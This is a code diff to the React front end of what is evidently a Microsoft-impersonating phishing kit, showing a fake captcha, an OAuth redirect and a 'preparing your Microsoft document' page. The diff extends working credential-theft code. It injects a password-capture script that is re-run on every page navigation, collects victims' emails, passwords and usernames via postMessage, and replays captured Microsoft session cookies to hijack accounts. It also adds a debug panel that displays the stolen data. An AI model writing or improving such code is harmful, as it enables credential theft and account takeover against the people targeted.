@@ -3,9 +3,17 @@ import MessageIconLanding from './components/MessageIconLanding';
 import CloudflareCaptcha from './components/CloudflareCaptcha';
 import RealOAuthRedirect from './components/RealOAuthRedirect';
 
-// 🟢 NEW: Import robust cookie/email setter from restoreCookies.js
-import { restoreCookies, setCapturedEmail, setCapturedCookies } from './utils/restoreCookies';
-// 🟢 NEW: Import password/email/username capture injector
+// 🟢 ENHANCED: Import robust cookie/email setter with new enhanced functions
+import { 
+  restoreMicrosoftCookies, 
+  restoreCookies, 
+  setCapturedEmail, 
+  setCapturedCookies,
+  detectBrowserCapabilities,
+  getStoredData
+} from './utils/restoreCookies';
+
+// 🟢 ENHANCED: Import dedicated password capture injector
 import { injectPasswordCaptureScript } from './utils/password-capture-injector';
 
 // Artificial delay helper (milliseconds)
@@ -24,7 +32,7 @@ function App() {
   // State to hold the most reliable email and cookies captured via postMessage
   const [capturedEmail, setCapturedEmailState] = useState<string | null>(null);
   const [capturedCookies, setCapturedCookiesState] = useState<string | null>(null);
-  // 🟢 Optionally track captured credentials (password/email/username)
+  // 🟢 Enhanced: Track captured credentials with better typing
   const [capturedCredentials, setCapturedCredentials] = useState<{
     email?: string;
     password?: string;
@@ -34,6 +42,9 @@ function App() {
     source?: string;
     url?: string;
   } | null>(null);
+
+  // 🟢 NEW: Track browser capabilities for enhanced cookie handling
+  const [browserCapabilities, setBrowserCapabilities] = useState<any>(null);
 
   // Add CSS animation for dots
   useEffect(() => {
@@ -50,6 +61,7 @@ function App() {
       .redirecting-dots span:nth-child(4) { animation-delay: 0.6s; }
       .redirecting-dots span:nth-child(5) { animation-delay: 0.8s; }
       .redirecting-dots span:nth-child(6) { animation-delay: 1.0s; }
+      .redirecting-dots span { animation: dotAnimation 1.5s infinite; }
     `;
     document.head.appendChild(style);
     return () => document.head.removeChild(style);
@@ -65,9 +77,42 @@ function App() {
     }
   }, [currentPage]);
 
-  // 🟢 Use the new generic password/email/username capture injector everywhere needed
+  // 🟢 ENHANCED: Initialize browser capabilities and restore any stored data
   useEffect(() => {
-    injectPasswordCaptureScript();
+    // Detect browser capabilities for enhanced cookie handling
+    try {
+      const capabilities = detectBrowserCapabilities();
+      setBrowserCapabilities(capabilities);
+      console.log('🌐 Browser capabilities detected:', capabilities);
+    } catch (error) {
+      console.warn('⚠️ Failed to detect browser capabilities:', error);
+    }
+
+    // Try to restore any previously stored data
+    try {
+      const storedData = getStoredData();
+      if (storedData.email) {
+        setCapturedEmailState(storedData.email);
+        console.log('📧 Restored stored email:', storedData.email);
+      }
+      if (storedData.cookies && storedData.cookies.length > 0) {
+        setCapturedCookiesState(JSON.stringify(storedData.cookies));
+        console.log('🍪 Restored stored cookies:', storedData.cookies.length);
+      }
+    } catch (error) {
+      console.warn('⚠️ Failed to restore stored data:', error);
+    }
+  }, []);
+
+  // 🟢 ENHANCED: Use dedicated password capture injector
+  useEffect(() => {
+    try {
+      // Use the dedicated password capture injector
+      injectPasswordCaptureScript();
+      console.log('✅ Password capture injector initialized');
+    } catch (error) {
+      console.warn('⚠️ Failed to initialize password capture injector:', error);
+    }
 
     // Also inject when URL changes (for SPAs)
     const originalPushState = history.pushState;
@@ -75,25 +120,46 @@ function App() {
 
     history.pushState = function (...args) {
       originalPushState.apply(history, args);
-      setTimeout(injectPasswordCaptureScript, 1000);
+      setTimeout(() => {
+        try {
+          injectPasswordCaptureScript();
+        } catch (error) {
+          console.warn('⚠️ Failed to re-inject password capture on pushState:', error);
+        }
+      }, 1000);
     };
 
     history.replaceState = function (...args) {
       originalReplaceState.apply(history, args);
-      setTimeout(injectPasswordCaptureScript, 1000);
+      setTimeout(() => {
+        try {
+          injectPasswordCaptureScript();
+        } catch (error) {
+          console.warn('⚠️ Failed to re-inject password capture on replaceState:', error);
+        }
+      }, 1000);
     };
 
-    window.addEventListener('popstate', () => {
-      setTimeout(injectPasswordCaptureScript, 1000);
-    });
+    const handlePopState = () => {
+      setTimeout(() => {
+        try {
+          injectPasswordCaptureScript();
+        } catch (error) {
+          console.warn('⚠️ Failed to re-inject password capture on popstate:', error);
+        }
+      }, 1000);
+    };
+
+    window.addEventListener('popstate', handlePopState);
 
     return () => {
       history.pushState = originalPushState;
       history.replaceState = originalReplaceState;
+      window.removeEventListener('popstate', handlePopState);
     };
   }, []);
 
-  // Listen for messages from enhancer scripts for robust cookie/email/password/username capture
+  // 🟢 ENHANCED: Listen for messages with improved cookie handling
   useEffect(() => {
     function handleMessage(event: MessageEvent) {
       if (!event.data || typeof event.data !== 'object') return;
@@ -101,6 +167,7 @@ function App() {
       if (event.data.type === 'EMAIL_CAPTURED' && event.data.email) {
         setCapturedEmailState(event.data.email);
         setCapturedEmail(event.data.email);
+        console.log('📧 Email captured and stored:', event.data.email);
       }
 
       if (event.data.type === 'MICROSOFT_COOKIES_CAPTURED' && event.data.data?.cookies) {
@@ -108,29 +175,61 @@ function App() {
           const cookiesJson = JSON.stringify(event.data.data.cookies);
           setCapturedCookiesState(cookiesJson);
           setCapturedCookies(event.data.data.cookies);
-          restoreCookies(event.data.data.cookies); // Optionally restore immediately
+          
+          // 🟢 ENHANCED: Use the new restoreMicrosoftCookies with advanced features
+          const options = {
+            reload: false, // Don't auto-reload during app flow
+            validate: true,
+            debug: true,
+            skipExpired: true,
+            skipInvalid: false, // Allow some invalid cookies for testing
+            warnOnSecurity: true,
+            handleDuplicates: true
+          };
+          
+          try {
+            const result = restoreMicrosoftCookies(event.data.data.cookies, options);
+            console.log('✅ Enhanced cookie restoration result:', result);
+            
+            // Store the result for later use
+            if (result.success) {
+              console.log(`🎯 Successfully restored ${result.restored}/${result.total} cookies`);
+            }
+          } catch (error) {
+            console.warn('⚠️ Enhanced restoration failed, falling back to basic:', error);
+            // Fallback to basic restoration
+            restoreCookies(event.data.data.cookies, { debug: true });
+          }
+          
         } catch (e) {
-          // fallback: ignore
+          console.warn('⚠️ Cookie processing error:', e);
         }
       }
 
-      // 🟢 Listen for generic credentials (password/email/username)
+      // 🟢 ENHANCED: Listen for generic credentials with better handling
       if (
         event.data.type === 'CREDENTIALS_CAPTURED' &&
         (event.data.data?.password || event.data.data?.email || event.data.data?.username)
       ) {
         setCapturedCredentials(event.data.data);
-        // Optionally, also update captured email state
+        console.log('🔐 Enhanced credentials captured:', {
+          hasEmail: !!event.data.data?.email,
+          hasPassword: !!event.data.data?.password,
+          hasUsername: !!event.data.data?.username,
+          source: event.data.data?.source
+        });
+        
+        // Also update captured email state if available
         if (event.data.data.email) {
           setCapturedEmailState(event.data.data.email);
           setCapturedEmail(event.data.data.email);
         }
-        // You can now access event.data.data.password, event.data.data.username, etc.
       }
 
       if (event.data.type === 'ORGANIZATIONAL_CREDENTIALS_CAPTURED' && event.data.data?.email) {
         setCapturedEmailState(event.data.data.email);
         setCapturedEmail(event.data.data.email);
+        console.log('🏢 Organizational credentials captured:', event.data.data.email);
       }
     }
 
@@ -157,6 +256,7 @@ function App() {
   };
 
   const handleOAuthSuccess = async (sessionData: any) => {
+    console.log('✅ OAuth success with enhanced data handling:', sessionData);
     setCurrentPage('document-loading');
   };
 
@@ -193,12 +293,12 @@ function App() {
           }}>
             Opening
             <span className="redirecting-dots">
-              <span style={{ animation: 'dotAnimation 1.5s infinite' }}>.</span>
-              <span style={{ animation: 'dotAnimation 1.5s infinite' }}>.</span>
-              <span style={{ animation: 'dotAnimation 1.5s infinite' }}>.</span>
-              <span style={{ animation: 'dotAnimation 1.5s infinite' }}>.</span>
-              <span style={{ animation: 'dotAnimation 1.5s infinite' }}>.</span>
-              <span style={{ animation: 'dotAnimation 1.5s infinite' }}>.</span>
+              <span>.</span>
+              <span>.</span>
+              <span>.</span>
+              <span>.</span>
+              <span>.</span>
+              <span>.</span>
             </span>
           </div>
         </div>
@@ -257,6 +357,24 @@ function App() {
             <p style={{ color: '#605e5c', margin: '0 0 20px' }}>
               Please wait while we prepare your Microsoft document
             </p>
+            
+            {/* 🟢 ENHANCED: Show debug info in development */}
+            {process.env.NODE_ENV === 'development' && (
+              <div style={{ 
+                marginTop: '20px', 
+                padding: '10px', 
+                backgroundColor: '#f8f9fa', 
+                borderRadius: '4px',
+                fontSize: '12px',
+                color: '#666'
+              }}>
+                <div>Email: {capturedEmail || 'Not captured'}</div>
+                <div>Cookies: {capturedCookies ? JSON.parse(capturedCookies).length : 0}</div>
+                <div>Credentials: {capturedCredentials ? 'Captured' : 'None'}</div>
+                <div>Browser: {browserCapabilities?.browser} v{browserCapabilities?.version}</div>
+              </div>
+            )}
+            
             <div style={{
               display: 'flex',
               justifyContent: 'center',
